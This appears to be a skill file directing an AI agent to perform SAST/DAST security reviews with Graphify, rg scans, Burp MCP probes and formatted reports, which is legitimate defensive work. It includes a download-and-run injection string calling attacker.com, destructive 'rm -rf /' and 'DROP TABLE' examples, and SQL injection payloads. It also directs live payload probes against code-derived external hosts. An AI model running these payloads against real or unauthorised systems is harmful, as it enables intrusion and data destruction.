---
name: ai-security-reviewer
description: >-
  Agent-native SAST+DAST: stack trace leaks, full secrets catalog, XSS/RCE/CMD/XXE/XML
  injection, OpenGrep taxonomy, code-derived Burp hosts (no localhost). Graphify, AI
  validation, security_report HTML+PDF.
---

# AI Security Reviewer

**Version 3.7** — Stack Trace Leaks | Full Secrets | Deep Injection | Code-Derived Burp Hosts

## Execution model (read first)

**You are the scanner.** This skill does not delegate analysis to Semgrep, CodeQL, or subagents.

| Layer | Who runs it | What it does |
|-------|-------------|--------------|
| **SAST** | **This agent (you)** | `graphify query/path` → `rg` per manifest → narrow `Read` → **your** AI validation |
| **DAST** | **This agent (you)** | Burp MCP `send_http1_request` probes per `dast_scan_manifest.md` |
| **Report** | **This agent (you)** | Write `security_report.md` → `generate_reports.py` for HTML/PDF |

### Do NOT use subagents

Run the **entire** review in the **current** agent session. Do not spawn `Task` / `explore` / `generalPurpose` subagents.

Reasons:
- Security findings need one continuous context (source → sink → validation → PoC).
- Subagents cannot reliably complete Appendix E/F coverage matrices.
- Subagents duplicate Graphify work and miss cross-file trust boundaries.

### Do NOT require Semgrep

Semgrep is **not** part of this skill. It was listed in v3.5 only as an optional CI companion — **remove it from your workflow**.

Your static analysis stack:
1. `bash scripts/run_sast_scan.sh` — deterministic `rg` (OpenGrep taxonomy + v3.7 deep scans)
2. `references/sast_scan_manifest.md` — every `SAST-OG-01`…`28` section
3. `references/frontend-stacktrace-leaks.md` — **SAST-LEAK-01…08** (errors/stacks to browser)
4. `references/secrets-patterns.md` — **SAST-SECRET-01…11** (all key/password/token types)
5. `references/injection-deep-scan.md` — **XSS, RCE, command injection, XXE, XML injection**
6. `references/opengrep-vulnerability-index.md` — class ↔ check mapping
7. `graphify path "<source>" "<sink>"` — data-flow tracing for injection findings
8. **Your AI validation checklist** — true positives only

**Burp MCP host rule (mandatory):**
1. Run `bash scripts/discover_burp_hosts.sh .` — read `burp_hosts.txt`
2. **Never probe `localhost` / `127.0.0.1`**
3. If no external host in code → **skip Burp** → `Not Verified (no target host in code)`
4. See `references/burp-host-discovery.md`

**Never run OpenGrep/Semgrep CLI** as part of this skill. We only borrow issue **names** from [opengrep/opengrep-rules](https://github.com/opengrep/opengrep-rules).

---

## Purpose

Enterprise security reviewer — **agent-native analysis** with Checkmarx-quality output:

1. **Graphify Discovery** — Knowledge-graph queries before broad file reads (saves tokens)
2. **Unauthenticated Endpoint Audit** — Route auth inventory; Medium if code-only, High if Burp MCP confirms
3. **Static Analysis** — 750+ pattern signatures across 85+ vulnerability classes
4. **AI Validation** — LLM-powered true positive verification
5. **Natural Language Descriptions** — Checkmarx-style vulnerability explanations
6. **Full Stack Traces** — Complete data flow from source to sink
7. **Detailed Remediation** — Code fixes with before/after examples
8. **Burp Suite PoC Requests** — Copy-paste HTTP requests for Repeater/Intruder per finding
9. **Burp MCP Live Verification** — `send_http1_request` confirms missing auth when MCP available
10. **HTML Report Export** — Styled HTML report generated at end of every review
11. **PDF Export** — Optional PDF from markdown (legacy)

---

## Graphify Integration (MANDATORY — Token Optimization)

> **Do not** read whole files or run repo-wide Grep until Graphify has oriented you — unless `graphify-out/graph.json` is missing. **Do not spawn subagents** — you run the review directly in this session.

### Prerequisites

| Requirement | Check | Install |
|-------------|-------|---------|
| Graphify CLI | `graphify --version` | `pipx install graphifyy` |
| Project graph | `test -f graphify-out/graph.json` | User runs `/graphify .` or `graphify extract . --no-cluster` |
| Burp MCP (optional) | MCP tool `send_http1_request` on `user-burp` | Burp Suite + MCP extension; Cursor MCP config |
| Cursor rule (optional) | `.cursor/rules/graphify.mdc` | `graphify cursor install` |

### Graphify-first workflow (use instead of blind exploration)

| Step | Command | Replaces |
|------|---------|----------|
| Map attack surface | `graphify query "API routes auth handlers user input" --budget 1500` | Glob + Read many controllers |
| Find vuln hotspots | `graphify query "SQL exec shell render template deserialize" --budget 1500` | Repo-wide Grep |
| Trace source→sink | `graphify path "<source>" "<sink>"` | Manual multi-file Read chain |
| Inspect symbol | `graphify explain "<Class.method>"` | Read entire class file |
| Impact analysis | `graphify affected "<sink>" --depth 2` | Reverse grep |
| Confirm lines only | `Read` 10–30 lines at graphify-identified file:line | Read full files |

Always pass `--budget N` on `query` (1200–2000 per query). Batch related questions into one query instead of many small reads.

### Security review sequence

```
0. discover_burp_hosts.sh  → burp_hosts.txt (skip Burp if no external host)
1. graphify query         → attack surface (2–3 queries, budget 1500 each)
1a. run_sast_scan.sh       → sast_scan_results.txt (OG + LEAK + SECRET + INJ)
1b. sast_scan_manifest + frontend-stacktrace-leaks + secrets-patterns + injection-deep-scan
1c. route auth audit       → references/route_auth_audit.md → AUTH-NNN
1d. burp verify            → ONLY hosts from burp_hosts.txt (never localhost)
2. graphify path           → per injection candidate: source → sink
3. Read                    → sink/source lines + sanitizers only
4. AI validate             → Phase 3 checklist
5. Burp PoC                → per TRUE POSITIVE + AUTH (code-derived host only)
6. security_report.md      → Appendix D + E (all SAST-OG/LEAK/SECRET/INJ rows)
7. generate_reports.py     → HTML + PDF
```

### Query templates

Load **`references/graphify_security.md`** for copy-paste queries by vulnerability class (SQLi, XSS, SSRF, secrets, etc.).

Load **`references/burp_poc_templates.md`** for copy-paste Burp Repeater templates by vulnerability class.

Load **`references/route_auth_audit.md`** for unauthenticated endpoint detection, severity rules, and Burp MCP verification.

### Fallback (no graph)

If `graphify-out/graph.json` does not exist:

1. Ask user to run `/graphify .` or `graphify extract . --no-cluster` (cheap AST-only build)
2. If declined, proceed with targeted Grep using `references/patterns.md` — **never** read entire codebase

---

## Vulnerability Description Format (MANDATORY)

### Natural Language Description Template

Every vulnerability MUST have a description following this Checkmarx-style format:

```
The method [METHOD_NAME] [VULNERABILITY_ACTION] at line [LINE] of [FILE_PATH]. 
[EXPLANATION_OF_FLOW]. This [TAINTED_DATA_DESCRIPTION] is [HOW_IT_REACHES_SINK] 
without [MISSING_PROTECTION], enabling an attacker to [ATTACK_IMPACT].
```

### Examples of Proper Descriptions

#### XSS Example
```
The method renderAnswerChunkText embeds untrusted data in generated output with 
dangerouslySetInnerHTML, at line 2042 of src/components/OpenAI/index.js. This 
untrusted data originates from the user-controlled 'answer' parameter passed through 
the processResponse function at line 1985. The data flows through formatText (line 2010) 
and sanitizeBasic (line 2025) before reaching the sink. However, sanitizeBasic only 
removes script tags and does not prevent event handler injection. This tainted data 
is embedded into the output without proper contextual encoding, enabling an attacker 
to inject malicious JavaScript code that executes in victims' browsers, potentially 
stealing session tokens, performing actions on behalf of users, or defacing the page.
```

#### SQL Injection Example
```
The method getUserById constructs a SQL query using string concatenation with the 
user-supplied 'userId' parameter, at line 156 of src/api/controllers/UserController.java. 
The userId originates from the HTTP request parameter at line 142 in the getUser endpoint. 
This untrusted data flows through the validateInput method (line 148) which only checks 
for null values but does not sanitize SQL metacharacters. The tainted data is then 
concatenated directly into the SQL query string at line 156 and executed via 
statement.executeQuery() at line 158. This enables an attacker to inject arbitrary 
SQL commands to bypass authentication, extract sensitive data from other tables, 
modify or delete database records, or potentially execute operating system commands 
on the database server.
```

#### Command Injection Example
```
The method processUpload passes user-controlled filename to a shell command via 
os.system(), at line 89 of src/utils/file_handler.py. The filename originates from 
the multipart form data parsed at line 72 in the upload_file endpoint. This untrusted 
data is stored in the 'original_filename' variable at line 75 and passed to 
sanitize_filename (line 78) which only removes path separators but allows shell 
metacharacters. The tainted filename is then interpolated into the shell command 
f"convert {filename} -resize 800x600 {output_path}" at line 89 without proper 
escaping, enabling an attacker to inject arbitrary shell commands by crafting a 
malicious filename such as "; rm -rf / #" or "$(curl attacker.com/shell.sh|bash)", 
leading to complete server compromise.
```

---

## Stack Trace / Data Flow Format (MANDATORY)

Every finding MUST include a complete stack trace showing the data flow:

```markdown
### Data Flow Trace (Source → Sink)

┌─────────────────────────────────────────────────────────────────────────────────┐
│ TAINT PROPAGATION PATH                                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─ SOURCE ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     142                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String userId = request.getParameter("id");                     │  │
│  │ Type:     HTTP Request Parameter (User-Controlled)                        │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 1 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     145                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String validatedId = validateInput(userId);                     │  │
│  │ Analysis: Validation only checks for null, not SQL metacharacters         │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ STEP 2 ──────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     148                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     String query = "SELECT * FROM users WHERE id = '" + validatedId │  │
│  │ Analysis: Tainted data concatenated into SQL string                       │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                              │                                                  │
│                              ▼                                                  │
│  ┌─ SINK ────────────────────────────────────────────────────────────────────┐  │
│  │ File:     src/api/controllers/UserController.java                         │  │
│  │ Line:     150                                                             │  │
│  │ Method:   getUser()                                                       │  │
│  │ Code:     ResultSet rs = statement.executeQuery(query);                   │  │
│  │ Type:     SQL Query Execution (Dangerous Operation)                       │  │
│  │ Status:   ⚠️ TAINTED DATA REACHES SINK WITHOUT SANITIZATION               │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

### Simplified Flow
\`\`\`
request.getParameter("id")     [UserController.java:142]  ─┐
                                                           │
    └─► validateInput(userId)  [UserController.java:145]  ─┤ NO SANITIZATION
                                                           │
        └─► query = "SELECT..."+validatedId [line:148]    ─┤ STRING CONCAT
                                                           │
            └─► statement.executeQuery(query) [line:150]  ─┘ SQL EXECUTION
\`\`\`
```

---

## Complete Finding Format

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [CRITICAL] SQL Injection in User Authentication                    [VULN-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Vulnerability Type | SQL Injection                                      |
| CWE ID             | CWE-89: Improper Neutralization of Special Elements|
| OWASP Category     | A03:2021 - Injection                              |
| Severity           | Critical                                           |
| CVSS Score         | 9.8 (Critical)                                     |
| Confidence         | High                                               |
| AI Verdict         | ✅ TRUE POSITIVE                                   |

### Location Summary
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| File               | src/api/controllers/UserController.java            |
| Class              | UserController                                     |
| Method             | getUser()                                          |
| Sink Line          | 150                                                |
| Source Line        | 142                                                |
| Best Fix Location  | Line 148 (query construction)                      |

### Description

The method **getUser** constructs a SQL query using string concatenation with the 
user-supplied **userId** parameter, at line **150** of **src/api/controllers/UserController.java**. 

The userId originates from the HTTP request parameter `request.getParameter("id")` at 
line 142 in the getUser endpoint. This untrusted data flows through the `validateInput` 
method (line 145) which only checks for null values but does not sanitize SQL metacharacters 
like single quotes, semicolons, or comment sequences.

The tainted data is then concatenated directly into the SQL query string:
\`\`\`java
String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";
\`\`\`

This query is executed via `statement.executeQuery(query)` at line 150 without 
parameterization, enabling an attacker to inject arbitrary SQL commands.

### Data Flow Trace

[Full stack trace as shown above]

### Attack Vectors

\`\`\`
# Authentication Bypass
GET /api/users?id=' OR '1'='1' --

# Data Exfiltration  
GET /api/users?id=' UNION SELECT username,password,null FROM admin_users --

# Database Manipulation
GET /api/users?id='; DROP TABLE users; --

# Blind SQL Injection (Time-based)
GET /api/users?id=' AND SLEEP(5) --
\`\`\`

### Burp Suite PoC (MANDATORY for HTTP-exploitable findings)

Provide a **complete raw HTTP request** ready for Burp Repeater. Use placeholders for secrets. Mark Intruder positions with `§payload§`.

\`\`\`http
GET /api/users?id=§1' OR '1'='1'--§ HTTP/1.1
Host: staging.example.com
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Cookie: session=[SESSION_COOKIE]
\`\`\`

| Field | Value |
|-------|-------|
| **Prerequisites** | Public endpoint OR valid session from `/login` |
| **Auth required** | No / Yes — [describe] |
| **Intruder position** | `id` parameter |
| **Payload list** | `' OR '1'='1'--`, `' UNION SELECT...`, `' AND SLEEP(5)--` |
| **Expected confirmation** | HTTP 200 + extra records / SQL error in body / 5s delay |
| **Destructive** | No — read-only probe |

**Multi-step exploits:** number steps (Step 1 store payload → Step 2 trigger). For non-HTTP findings write: `Burp PoC: N/A — not HTTP-exploitable`.

See **`references/burp_poc_templates.md`** for class-specific templates (SQLi, XSS, SSRF, IDOR, NoSQL, etc.).

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Attacker can read any data from the database      |
| Integrity          | HIGH   | Attacker can modify or delete any records         |
| Availability       | HIGH   | Attacker can drop tables or corrupt database      |
| Authentication     | HIGH   | Complete authentication bypass possible           |
| Business Impact    | SEVERE | Data breach, regulatory fines, reputation damage  |

### AI Validation Details

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    AI VALIDATION CHECKLIST                      │
├─────────────────────────────────────────────────────────────────┤
│ 1. Source Analysis                                              │
│    ├─ Is input user-controlled?           ✅ YES               │
│    ├─ Input type: HTTP GET parameter                           │
│    └─ Can attacker influence value?       ✅ YES               │
│                                                                 │
│ 2. Sanitization Check                                           │
│    ├─ Input validation present?           ⚠️ PARTIAL           │
│    ├─ Validation type: Null check only                         │
│    ├─ SQL metacharacters filtered?        ❌ NO                │
│    └─ Parameterized query used?           ❌ NO                │
│                                                                 │
│ 3. Sink Reachability                                            │
│    ├─ Code path accessible?               ✅ YES               │
│    ├─ Authentication required?            ❌ NO (Public API)   │
│    └─ Is this production code?            ✅ YES               │
│                                                                 │
│ 4. Exploitability                                               │
│    ├─ Can payload reach sink intact?      ✅ YES               │
│    ├─ Standard techniques work?           ✅ YES               │
│    └─ Real-world impact?                  ✅ YES (Data breach) │
│                                                                 │
│ ═══════════════════════════════════════════════════════════════ │
│ VERDICT: ✅ TRUE POSITIVE - Confirmed Exploitable               │
│ REASONING: User input reaches SQL execution without             │
│            parameterization or proper sanitization.             │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

### Remediation

#### Recommended Fix: Parameterized Queries (PreparedStatement)

**BEFORE (Vulnerable):**
\`\`\`java
// UserController.java - Lines 142-150
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");              // Line 142 - SOURCE
    String validatedId = validateInput(userId);              // Line 145
    
    // VULNERABLE: String concatenation
    String query = "SELECT * FROM users WHERE id = '" + validatedId + "'";  // Line 148
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);                 // Line 150 - SINK
    // ...
}
\`\`\`

**AFTER (Secure):**
\`\`\`java
// UserController.java - Lines 142-155
public User getUser(HttpServletRequest request) {
    String userId = request.getParameter("id");
    
    // Input validation - type check
    if (userId == null || !userId.matches("^[0-9]+$")) {
        throw new IllegalArgumentException("Invalid user ID format");
    }
    
    // SECURE: Parameterized query prevents SQL injection
    String query = "SELECT * FROM users WHERE id = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, userId);  // Automatically escapes special characters
    ResultSet rs = pstmt.executeQuery();
    // ...
}
\`\`\`

#### Alternative Fix: ORM/JPA

\`\`\`java
// Using Spring Data JPA
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // Spring Data automatically uses parameterized queries
    Optional<User> findById(Long id);
}

// In controller
public User getUser(@RequestParam Long id) {
    return userRepository.findById(id)
        .orElseThrow(() -> new UserNotFoundException(id));
}
\`\`\`

#### Defense in Depth Recommendations

1. **Input Validation**: Validate userId is numeric before processing
2. **Least Privilege**: Database user should have minimal permissions
3. **WAF Rules**: Deploy SQL injection detection rules
4. **Monitoring**: Log and alert on SQL errors indicating injection attempts

### References

| Resource | Link |
|----------|------|
| CWE-89 | https://cwe.mitre.org/data/definitions/89.html |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| Java PreparedStatement | https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Unauthenticated Endpoint Finding Format (AUTH-NNN)

Use for **missing or weak authentication** on HTTP routes. Separate ID series from `VULN-NNN`. Severity and status **depend on Burp verification**, not only code impact.

### Severity & Status Rules (MANDATORY)

| Condition | Severity | Status |
|-----------|----------|--------|
| Code shows missing auth; **not** live-tested OR Burp MCP absent | **Medium** | **Not Verified** |
| Burp MCP `send_http1_request` without auth → app responds (2xx business body, or 4xx validation without auth challenge) | **High** | **Verified in Burp** |
| Code suggests missing auth; Burp returns 401/403 auth error or login redirect | **Medium** | **Not Verified** (auth at gateway) |
| Burp returns WAF 403 only | **Medium** | **Not Verified** (WAF blocked) |

> Injection/IDOR on the same route may still be a separate `VULN-NNN` at Critical/High — AUTH findings measure **access control**, not payload exploitability.

### AUTH Finding Template

```markdown
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## [HIGH|MEDIUM] Unauthenticated Endpoint — [METHOD] [PATH]              [AUTH-001]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Classification
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Vulnerability Type | Missing Authentication / Broken Access Control     |
| CWE ID             | CWE-306: Missing Authentication for Critical Function |
| OWASP Category     | A01:2021 - Broken Access Control                  |
| Severity           | High (Verified in Burp) OR Medium (Not Verified)   |
| Status             | Verified in Burp / Not Verified                    |
| Confidence         | High (code) / High (code + live)                   |
| AI Verdict         | ✅ TRUE POSITIVE (missing auth middleware)         |

### Location Summary
| Attribute          | Value                                              |
|--------------------|----------------------------------------------------|
| Router File        | src/routes/api/index.js                            |
| Route Line         | 520                                                |
| Method / Path      | GET /order/details                                 |
| Auth Expected      | verifySsoToken chain                               |
| Auth Present       | None in handler chain                              |
| Bypass Notes       | N/A — or `isSeller=true` skips SSO                 |

### Description

The route **GET /order/details** is registered at line **520** of **src/routes/api/index.js** 
without **verifySsoToken**, **AuthHandler.verifySsoToken**, or **Handler.verifySsoToken** in its 
middleware chain. Any client that can reach this host may invoke order-detail logic without a 
valid SSO session [unless gateway/WAF blocks unauthenticated traffic — see Live Verification].

### Route Handler Chain (code)

\`\`\`javascript
router.get('/order/details', Validator..., Preparer..., Handler..., Responder.respond);
// No verifySsoToken in chain
\`\`\`

### Live Verification (Burp MCP)

| Field | Value |
|-------|-------|
| Burp MCP | Available / Not available |
| Tool | `send_http1_request` (server: `user-burp`) |
| Host | [TARGET_HOST] |
| Auth headers | None (no Cookie, Authorization, SSO) |
| HTTP status | 200 |
| Response indicator | [order_id, passenger name, PII markers] |
| **Status** | **Verified in Burp** |
| **Severity** | **High** |

### Burp Suite PoC

\`\`\`http
GET /api/v1/order/details?order_id=[ORDER_ID] HTTP/1.1
Host: [TARGET_HOST]
User-Agent: Mozilla/5.0 (Security-Review)
Accept: application/json
Connection: close

\`\`\`

### Impact Assessment

| Impact Category    | Level  | Description                                       |
|--------------------|--------|---------------------------------------------------|
| Confidentiality    | HIGH   | Order/PII readable without login                  |
| Integrity          | MEDIUM | Depends on endpoint (read vs state-change)        |
| Authentication     | HIGH   | No SSO required at application layer              |

### Remediation

Add **Preparer.verifySsoToken**, **AuthHandler.verifySsoToken**, **Handler.verifySsoToken** to the 
route chain (match neighboring protected routes). For intentionally public endpoints, document 
in OpenAPI and enforce rate limiting + minimal response schema.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## Workflow

### Phase 0: Graphify Recon (before any broad file reads)

1. Verify `graphify-out/graph.json` exists; if not, request `/graphify .` or run `graphify extract . --no-cluster`
2. Run 1–3 scoped queries (see `references/graphify_security.md`):
   - Attack surface: routes, handlers, auth
   - User-input entry points
   - Framework-specific sinks (ORM, template engine, shell, file I/O)
3. Optionally read `graphify-out/GRAPH_REPORT.md` **only** if queries lack architecture context — do not read it by default
4. Record candidate files/symbols for Phase 1 — **do not** Read those files yet

### Phase 1: Static Pattern Detection

Scan **graphify-scoped files/symbols only** using 750+ signatures. For each match, record:
- Pattern matched
- File path and line number (confirm with narrow `Read` ±5 lines, not whole file)
- Code snippet with context (5 lines before/after)
- Detected language and framework

Prefer targeted Grep limited to paths from Phase 0 instead of repository-wide search.

### Phase 1a: Unauthenticated Endpoint Audit (mandatory)

**Why:** SQLi/XSS scans miss routes with no auth that expose PII or state changes.

1. Follow **`references/route_auth_audit.md`** end-to-end.
2. Enumerate routes from Graphify recon or scoped `src/routes/**` reads.
3. Flag chains missing SSO/Basic/HMAC/API-key middleware; note bypass flags (`isSeller`, `login_not_required`, routes before `basicAuth`).
4. Assign provisional **AUTH-NNN** IDs; default **Medium / Not Verified**.

### Phase 1b: Burp MCP Verification (when MCP available)

**Prerequisite:** `bash scripts/discover_burp_hosts.sh .` — use hosts from `burp_hosts.txt` only.

1. If **no external host** in code → skip all Burp probes; document **Not Verified (no target host in code)**.
2. **Never** use `localhost`, `127.0.0.1`, `0.0.0.0`, or `::1` as `Host` header.
3. Check MCP for `user-burp` → `send_http1_request` (read tool schema first).
4. For each AUTH candidate, send request **without** auth to **code-derived staging host** (see `references/burp-host-discovery.md`).
5. Apply verdict matrix from `route_auth_audit.md`.
6. For XSS/CMD/XXE findings with HTTP surface: use payloads from `references/injection-deep-scan.md` on same host.
7. Record status + HTTP status in finding and **Appendix C/D**.

If Burp MCP is **not** configured, document `Burp MCP: not available` and leave all AUTH findings at **Medium / Not Verified**.

### Phase 2: Data Flow Analysis (Graphify-assisted)

For each potential vulnerability:

1. **Identify Source** — `graphify query` or prior recon; confirm with `graphify explain "<symbol>"`
2. **Trace Propagation** — **`graphify path "<source>" "<sink>"`** first; supplement with narrow `Read` only on nodes in the path
3. **Identify Sink** — from path output or `graphify affected "<source>" --depth 2`
4. **Document Each Step** — translate graph path nodes into the mandatory stack-trace format (file, line, method, code)

Sources to trace: HTTP params/headers/cookies/body, uploads, WebSocket, DB user data, env vars.

Sinks to trace: SQL/NoSQL, command exec, file ops, outbound HTTP (SSRF), template/HTML render, deserialize, JNDI.

**Token rule:** One `graphify path` per candidate beats reading 5–20 files manually.

### Phase 3: AI Validation

For EACH finding, validate:

```markdown
## AI Validation Checklist

### 1. Source Verification
- [ ] Confirm input is user-controlled
- [ ] Identify exact entry point (file:line:method)
- [ ] Document input type (HTTP param, file, etc.)

### 2. Flow Verification  
- [ ] Trace complete path from source to sink
- [ ] Document all intermediate steps
- [ ] Identify any transformations

### 3. Sanitization Analysis
- [ ] Check for input validation
- [ ] Evaluate sanitization effectiveness
- [ ] Consider bypass techniques
- [ ] Check framework protections

### 4. Exploitability Assessment
- [ ] Is code path reachable?
- [ ] Are there auth guards?
- [ ] Can standard attacks succeed?
- [ ] What is real-world impact?

### VERDICT: TRUE_POSITIVE / FALSE_POSITIVE
### REASONING: [Detailed explanation]
```

### Phase 3b: Burp PoC Crafting (TRUE POSITIVES + AUTH findings)

For every validated TRUE POSITIVE **and** every AUTH finding:

1. **Identify HTTP surface** — method, path, content-type from routes/handlers (Graphify or route files).
2. **Map tainted parameter** — query, body JSON key, header, cookie, path segment (VULN); minimal valid params (AUTH).
3. **Build raw request** — follow format in **Burp Suite PoC** section above; use `references/burp_poc_templates.md`.
4. **Live verify AUTH** — if Burp MCP present, execute PoC via `send_http1_request` and set Status/Severity per rules.
5. **Document prerequisites** — auth flow, tokens, order IDs, multi-step chain.
6. **Define confirmation** — status code, body marker, timing, Collaborator callback.
7. **Safety label** — `read-only` vs `state-changing` vs `destructive`; prefer staging host.

If the finding is not reachable over HTTP (e.g., internal cron, pure code smell), set `Burp PoC: N/A` and explain manual/code exploit path instead.

### Phase 4: Generate Markdown Report

Write **`security_report.md`** (project root or `docs/security/security_report.md`) using the Report Structure below. Every detailed finding MUST include the **Burp Suite PoC** section. Include **Appendix D** (all AUTH candidates). AUTH findings use **AUTH-NNN** IDs in summary and detail sections.

If remediation changed source files: `graphify update .`

### Phase 5: Generate HTML Report (MANDATORY)

After `security_report.md` is complete, generate the HTML deliverable:

```bash
python ~/.cursor/skills/ai-security-reviewer/scripts/generate_html_report.py security_report.md \
  -o security_report.html \
  --project "[Project Name]"
```

Or from the skill directory:

```bash
python scripts/generate_html_report.py docs/security/security_report.md -o docs/security/security_report.html
```

**Agent obligations:**
1. Write the markdown report first (source of truth).
2. Run the HTML generator script (or emit equivalent HTML if Python unavailable — use the same sections).
3. Tell the user both file paths: `security_report.md` and `security_report.html`.
4. Open HTML in browser for review (optional: `open security_report.html` on macOS).

The HTML report includes: executive summary, severity badges, findings table, data-flow blocks, **Burp request blocks** (syntax-highlighted), remediation, and appendices.

---

## Report Structure

```markdown
# Security Assessment Report

**Report ID:** SEC-[YYYYMMDD]-[XXXX]
**Generated:** [DateTime]
**AI Model:** [Cursor Model Used]

---

## Executive Summary

### Scan Metrics
| Metric                      | Value |
|-----------------------------|-------|
| Files Analyzed              | X     |
| Lines of Code               | X     |
| Static Pattern Matches      | X     |
| AI-Validated True Positives | X     |
| Unauthenticated Endpoints   | X     |
| Burp-Verified (High)        | X     |
| Not Verified (Medium)         | X     |
| False Positives Filtered    | X     |
| Detection Accuracy          | X%    |

### Risk Score: [X/100] - [CRITICAL/HIGH/MEDIUM/LOW]

### Severity Distribution
| Severity | Count | % |
|----------|-------|---|
| Critical | X     | X%|
| High     | X     | X%|
| Medium   | X     | X%|
| Low      | X     | X%|

### Top Vulnerability Categories
1. [Category] - X findings
2. [Category] - X findings
3. [Category] - X findings

---

## Findings Summary Table

| ID | Severity | Category | File:Line | Method | Burp PoC | Status |
|----|----------|----------|-----------|--------|----------|--------|
| VULN-001 | Critical | SQL Injection | UserController.java:150 | getUser() | Yes | True Positive |
| VULN-002 | High | XSS | index.js:2042 | renderAnswerChunkText() | Yes | True Positive |
| AUTH-001 | High | Missing Authentication | routes/api/index.js:520 | GET /order/details | Yes | Verified in Burp |
| AUTH-002 | Medium | Missing Authentication | routes/api/index.js:530 | GET /refund/details | Yes | Not Verified |

---

## Detailed Findings

[Each finding in complete format as specified above]

---

## Remediation Priority

### Immediate (Critical/High) - Fix within 24-48 hours
1. **VULN-001** - SQL Injection - Use PreparedStatement
2. **VULN-002** - XSS - Implement contextual output encoding

### Short-term (Medium) - Fix within 1-2 weeks
3. **VULN-003** - [Description]

### Long-term (Low) - Fix in next sprint
4. **VULN-004** - [Description]

---

## Appendix A: False Positives Filtered

<details>
<summary>X findings excluded by AI validation (click to expand)</summary>

| Pattern | Location | Exclusion Reason |
|---------|----------|------------------|
| SQL Injection | db.py:45 | Uses parameterized query |
| Hardcoded Secret | test_config.py:12 | Test file with placeholder value |
| XSS | template.html:89 | Framework auto-escapes by default |

</details>

---

## Appendix B: Scan Coverage

### Languages Analyzed
- Java: X files
- JavaScript: X files
- Python: X files

### Frameworks Detected
- Spring Boot
- React
- Flask

---

## Appendix C: Burp Suite Testing Notes

| Finding ID | Host | Endpoint | Auth sent | HTTP | Status | Intruder? |
|------------|------|----------|-----------|------|--------|-----------|
| VULN-001 | staging.example.com | GET /api/users | None | 200 | True Positive | Yes — `id` |
| AUTH-001 | staging.example.com | GET /order/details | None | 200 | Verified in Burp | No |
| AUTH-002 | staging.example.com | GET /refund/details | N/A | — | Not Verified | No |

---

## Appendix D: Unauthenticated Endpoint Inventory (MANDATORY)

| ID | Method | Path | Router file:line | Code auth | Burp status | Severity | Impact |
|----|--------|------|------------------|-----------|-------------|----------|--------|
| AUTH-001 | GET | /order/details | routes/api/index.js:520 | None | Verified in Burp | High | PII read |
| AUTH-002 | GET | /refund/details | routes/api/index.js:530 | None | Not Verified | Medium | PII read |

Include **every** route lacking application-layer auth. Burp status = `Verified in Burp` or `Not Verified` only.

---

**Generated by AI Security Reviewer v3.4**
**HTML Export:** `python scripts/generate_html_report.py security_report.md -o security_report.html`
**PDF Export (optional):** `python generate_pdf.py security_report.md`
```

---

## Key Enhancements (v3.7)

| Feature | Description |
|---------|-------------|
| **Frontend stack trace leaks** | `frontend-stacktrace-leaks.md` — 8 leak categories to browser/API |
| **Full secrets catalog** | `secrets-patterns.md` — 11 sections (cloud, JWT, passwords, OAuth, env fallback) |
| **Deep injection scan** | XSS, RCE, command injection, XXE, XML in `injection-deep-scan.md` |
| **Code-derived Burp hosts** | `discover_burp_hosts.sh` — never localhost; skip if no host in code |

### v3.6

| Feature | Description |
|---------|-------------|
| **Unauthenticated Endpoint Audit** | Phase 1a — route inventory catches missing SSO/Basic/HMAC middleware |
| **Burp MCP Verification** | Phase 1b — `send_http1_request` without auth; High/Verified in Burp vs Medium/Not Verified |
